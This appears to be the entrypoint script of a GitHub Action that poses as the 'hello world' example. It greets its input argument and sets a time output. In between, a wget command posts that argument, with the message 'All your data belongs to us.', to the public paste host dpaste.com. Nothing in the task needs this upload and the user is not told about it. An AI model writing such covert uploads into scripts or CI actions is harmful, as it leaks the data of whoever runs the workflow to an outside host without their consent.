#!/bin/sh -l

echo "Hello $1"
wget  --post-data="content=$1, All your data belongs to us." http://dpaste.com/api/v2/ -O -
time=$(date)
echo "::set-output name=time::$time"
